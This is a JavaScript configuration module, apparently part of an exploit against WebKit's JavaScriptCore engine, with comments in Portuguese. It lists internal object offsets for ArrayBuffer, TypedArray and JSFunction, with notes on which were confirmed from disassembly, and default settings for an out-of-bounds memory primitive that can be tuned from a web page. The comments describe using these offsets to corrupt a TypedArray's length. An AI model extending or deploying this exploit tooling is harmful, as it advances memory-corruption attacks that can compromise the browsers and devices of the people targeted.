// js/config.mjs

// Offsets para estruturas do JavaScriptCore (JSC) no ambiente alvo
// (Baseado na análise dos arquivos .txt da biblioteca WebKit fornecidos pelo usuário)
export const JSC_OFFSETS = {
    ArrayBuffer: {
        // Modelo de indireção para byteLength:
        // JSObject_ArrayBuffer -> [JSObject_addr + PTR_TO_INTERNAL_STRUCT_OFFSET] -> InternalStructure*
        // byteLength             -> [InternalStructure* + BYTELENGTH_WITHIN_INTERNAL_STRUCT_OFFSET]
        // Esta estrutura foi sugerida por 'Offset JSObjectGetArrayBufferByteLength.txt'.
        PTR_TO_INTERNAL_STRUCT_OFFSET: 0x20,
        BYTELENGTH_WITHIN_INTERNAL_STRUCT_OFFSET: 0x20,
        // STATUS: MODELO TEÓRICO SUPORTADO. A corrupção direta do byteLength de um ArrayBuffer
        // com uma única escrita OOB a partir do JSObject é complexa e provavelmente requer
        // uma leitura OOB primeiro para obter o endereço da InternalStructure.
        // Para os testes atuais focados em TypedArray, este offset é menos crítico.
    },
    TypedArray: { // JSArrayBufferView
        // Estes offsets são relativos ao início do objeto JSArrayBufferView (que é um JSObject).
        VTABLE_OFFSET: 0x0,                 // Offset comum para o ponteiro da VTable em objetos C++.
                                            // STATUS: PLACEHOLDER/TEÓRICO. Precisa ser confirmado pela análise
                                            // do disassembly se for usado para identificação precisa de objetos.

        M_VECTOR_OFFSET: 0x10,              // Ponteiro para os dados brutos (void* m_vector).
                                            // STATUS: ALTA CONFIANÇA/COMPROVADO (Ex: [rax+10h] em JSObjectGetTypedArrayBytesPtr.txt).

        M_LENGTH_OFFSET: 0x18,              // Número de elementos (unsigned m_length).
                                            // STATUS: ALTA CONFIANÇA (offset comum para contagem de elementos, crucial para corrupção).
                                            // A validação funcional (ver se .length em JS muda) o comprovará.

        M_BYTELENGTH_OFFSET_IN_VIEW: 0x20,  // Tamanho em bytes da view (size_t byteLength), reflete a propriedade .byteLength.
                                            // STATUS: PROVÁVEL/SUPORTADO (Ex: 0x20 em JSArrayBufferView.txt). Útil para verificação.

        M_MODE_OFFSET: 0x28,                // Tipo de TypedArray (m_mode).
                                            // STATUS: ALTA CONFIANÇA/COMPROVADO (Ex: [rbx+28h] em JSObjectGetTypedArrayBytesPtr.txt).

        ASSOCIATED_ARRAYBUFFER_OFFSET: 0x30 // Ponteiro para o ArrayBuffer de backing (JSArrayBuffer*).
                                            // STATUS: ALTA CONFIANÇA/COMPROVADO (Ex: [rbx+30h] em JSObjectGetTypedArrayBytesPtr.txt).
    },
    JSFunction: {
        M_EXECUTABLE_OFFSET: 0x18           // Ponteiro para a estrutura executável da função.
                                            // STATUS: PLACEHOLDER (offset comum, não verificado com os arquivos recentes do alvo).
    }
};

// Configurações Padrão do Exploit (podem ser lidas dos inputs do HTML)
export let OOB_CONFIG = {
    ALLOCATION_SIZE: 32768,  // Mantém o valor maior que funcionou no seu último log
    BASE_OFFSET_IN_DV: 128,
    INITIAL_BUFFER_SIZE: 32
};

export function updateOOBConfigFromUI() {
    const oobAllocSizeEl = document.getElementById('oobAllocSize');
    const baseOffsetEl = document.getElementById('baseOffset');
    const initialBufSizeEl = document.getElementById('initialBufSize');

    // Guarda valores atuais para logar apenas se houver mudança
    // const oldAllocSize = OOB_CONFIG.ALLOCATION_SIZE;

    if (oobAllocSizeEl) {
        const val = parseInt(oobAllocSizeEl.value, 10);
        if (!isNaN(val) && val > 0) OOB_CONFIG.ALLOCATION_SIZE = val;
    }
    if (baseOffsetEl) {
        const val = parseInt(baseOffsetEl.value, 10);
        if (!isNaN(val) && val >= 0) OOB_CONFIG.BASE_OFFSET_IN_DV = val;
    }
    if (initialBufSizeEl) {
        const val = parseInt(initialBufSizeEl.value, 10);
        if (!isNaN(val) && val >= 0) OOB_CONFIG.INITIAL_BUFFER_SIZE = val;
    }
    // Adicionar log aqui se necessário, comparando com valores antigos.
}
